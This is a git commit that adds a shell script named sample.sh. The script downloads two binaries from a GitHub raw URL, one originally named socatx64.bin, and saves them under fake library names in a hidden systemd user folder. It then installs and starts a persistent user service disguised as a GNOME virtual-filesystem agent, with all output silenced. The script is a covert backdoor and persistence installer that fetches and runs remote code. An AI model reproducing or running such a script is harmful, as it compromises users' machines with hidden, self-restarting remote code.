92d9d85807ca26c342bac9f22f5e8f4b9280665e
qofiajsflkasdf <125467469+qofiajsflkasdf@users.noreply.github.com>
2023-04-19 15:51:38 +1000

    Create sample.sh

---
+++ sample.sh
@@ -0,0 +1,30 @@
+{
+mkdir -p $HOME/.config/systemd/user/libxct-util
+
+wget -O $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/socatx64.bin 
+
+wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/libdev.so.6 
+
+chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so
+chmod +x $HOME/.config/systemd/user/libxct-util/libdev.so.6
+
+
+cat > $HOME/.config/systemd/user/gvfs-agent.service << EOF
+[Unit]
+Description=Virtual filesystem service - agent
+StartLimitInterval=0
+[Service]
+WorkingDirectory=$HOME/.config/systemd/user
+ExecStart=/bin/bash -c "$HOME/.config/systemd/user/libxct-util/libdev.so.6"
+ExecStop=kill -HUP \$MAINPID
+Restart=always
+RestartSec=120
+RuntimeMaxSec=300
+TimeoutSec=300
+[Install]
+WantedBy=default.target
+EOF
+
+systemctl --user enable gvfs-agent.service
+systemctl --user start gvfs-agent.service
+} &> /dev/null
